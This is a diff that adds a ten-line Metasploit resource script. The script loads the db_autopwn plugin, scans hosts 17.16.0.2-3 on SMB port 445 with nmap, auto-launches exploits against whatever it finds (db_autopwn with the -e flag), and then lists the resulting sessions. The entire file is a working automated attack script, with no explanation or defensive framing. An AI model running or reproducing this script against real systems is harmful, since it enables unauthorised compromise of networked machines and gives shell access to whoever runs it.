@@ -1,0 +1,10 @@
+load db_autopwn
+hosts -d
+services -d
+db_nmap 17.16.0.2-3 -p 445 -v 1 -O --reason
+sleep 5
+hosts
+services
+db_autopwn -t -p -r -e -T 20
+sleep 5
+sessions
